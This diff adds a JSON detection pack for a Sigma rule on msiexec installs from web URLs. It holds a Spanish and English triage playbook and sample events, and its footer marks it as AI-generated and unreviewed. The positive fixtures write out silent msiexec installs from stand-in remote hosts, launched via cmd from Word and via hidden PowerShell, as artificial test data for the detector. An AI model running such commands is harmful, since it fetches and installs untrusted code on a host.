@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
+    "title": "MsiExec Web Install",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_msiexec_web_install.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1218.007"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya línea de comandos invoca msiexec con una dirección web (://) como parámetro. Esto puede indicar la descarga e instalación remota de un paquete MSI malicioso.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde CommandLine contiene a la vez ' msiexec' (con espacio inicial) y '://'. Por el espacio inicial, suele activarse en el shell padre (cmd.exe, PowerShell, scripts) que lanza msiexec con una URL, por ejemplo 'cmd /c msiexec /q /i http://...'.",
+      "why_it_matters": "msiexec es un binario firmado por Microsoft que puede descargar e instalar un MSI desde una URL, lo que le permite al atacante evadir controles (T1218.007, ejecución de proxy mediante binarios del sistema) y traer herramientas al equipo (T1105). Los custom actions del MSI se ejecutan con privilegios elevados.",
+      "triage_steps": [
+        "Revise CommandLine completo: extraiga la URL, el dominio o IP, el nombre del .msi y opciones como /q, /qn o /i que indiquen una instalación silenciosa.",
+        "Identifique Image y ParentImage: un cmd.exe o powershell.exe iniciado por Office, un navegador, wscript o mshta es muy sospechoso.",
+        "Verifique el usuario y si la cuenta normalmente instala software; compárelo con las herramientas de despliegue aprobadas (SCCM, Intune, GPO).",
+        "Investigue la reputación del dominio o IP y si la URL usa HTTP sin cifrar, IP directa o un hosting genérico.",
+        "Busque en el mismo host, en un rango de +/- 15 minutos, el proceso msiexec hijo, sus conexiones de red y los procesos que lanzó.",
+        "Revise el log Application (MsiInstaller, eventos 1033/11707) y archivos nuevos en C:\\Windows\\Installer o en %TEMP%.",
+        "Busque la misma URL o hash del MSI en otros endpoints y alertas previas del mismo usuario o host."
+      ],
+      "false_positives": [
+        "Scripts administrativos o herramientas de gestión que instalan software desde un repositorio web interno o de un proveedor.",
+        "Instaladores legítimos (agentes de monitoreo, VPN, navegadores) desplegados con 'msiexec /i https://...' por TI.",
+        "Técnicos de soporte que instalan software manualmente desde la URL oficial del fabricante."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con TI si la instalación estaba autorizada antes de actuar.",
+        "Si no está autorizada, aísle el endpoint y bloquee el dominio o IP en el proxy y el firewall.",
+        "Obtenga una copia del MSI o su hash, analícelo y busque artefactos de persistencia creados por sus custom actions.",
+        "Desinstale el paquete y elimine los artefactos verificados; restablezca las credenciales del usuario si hay indicios de compromiso.",
+        "Documente la URL y el hash como IOC y agregue a la lista de exclusiones solo las fuentes legítimas confirmadas."
+      ],
+      "severity_rationale": "Nivel medio: la técnica es abusada con frecuencia, pero las instalaciones web legítimas por scripts o TI son habituales y requieren contexto para confirmarse."
+    },
+    "en": {
+      "summary": "A process started with a command line invoking msiexec with a web address (://) as a parameter. This may indicate remote download and installation of a malicious MSI package.",
+      "what_it_detects": "Windows process creation events where CommandLine contains both ' msiexec' (with a leading space) and '://'. Because of the leading space, it usually fires on the parent shell (cmd.exe, PowerShell, scripts) launching msiexec with a URL, such as 'cmd /c msiexec /q /i http://...'.",
+      "why_it_matters": "msiexec is a Microsoft-signed binary that can fetch and install an MSI from a URL, letting attackers bypass controls (T1218.007, system binary proxy execution) and transfer tools onto the host (T1105). MSI custom actions often run with elevated privileges.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, domain or IP, .msi name and switches like /q, /qn or /i indicating a silent install.",
+        "Check Image and ParentImage: cmd.exe or powershell.exe spawned by Office, a browser, wscript or mshta is highly suspicious.",
+        "Verify the user and whether the account normally installs software; compare with approved deployment tools (SCCM, Intune, GPO).",
+        "Check reputation of the domain or IP, and whether the URL uses plain HTTP, a raw IP or generic hosting.",
+        "On the same host within +/- 15 minutes, find the child msiexec process, its network connections and any processes it spawned.",
+        "Review the Application log (MsiInstaller, events 1033/11707) and new files in C:\\Windows\\Installer or %TEMP%.",
+        "Search other endpoints for the same URL or MSI hash, and earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Admin scripts or management tools installing software from an internal or vendor web repository.",
+        "Legitimate installers (monitoring agents, VPN clients, browsers) deployed by IT with 'msiexec /i https://...'.",
+        "Support technicians manually installing software from the vendor's official URL."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the installation was authorized before acting.",
+        "If unauthorized, isolate the endpoint and block the domain or IP at the proxy and firewall.",
+        "Collect the MSI or its hash, analyze it and hunt for persistence created by its custom actions.",
+        "Uninstall the package and remove verified artifacts; reset the user's credentials if compromise is indicated.",
+        "Record the URL and hash as IOCs; allowlist only confirmed legitimate sources."
+      ],
+      "severity_rationale": "Medium: the technique is commonly abused, but legitimate web installs by scripts or IT are common and need context to confirm."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "cmd.exe spawned by Word runs a silent msiexec install from a remote HTTP URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c msiexec /q /i http://203.0.113.15/update/pkg.msi",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jperez\\Downloads\\factura.docm\""
+        }
+      },
+      {
+        "description": "PowerShell Start-Process launching msiexec against an HTTPS URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0177.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c Start-Process msiexec -ArgumentList '/i https://files.example.org/tools/setup.msi /qn'",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "msiexec installing a local MSI from an absolute path, no web address",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc-deploy",
+          "Image": "C:\\Windows\\System32\\msiexec.exe",
+          "CommandLine": "C:\\Windows\\System32\\msiexec.exe /i C:\\Temp\\agent.msi /qn",
+          "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe"
+        }
+      },
+      {
+        "description": "cmd.exe runs msiexec from an internal UNC share, which contains ' msiexec' but no '://'",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0210.andes.example.com",
+          "User": "ANDES\\admin.rgomez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c msiexec /i \\\\fs01.andes.example.com\\software\\7zip.msi /qn",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
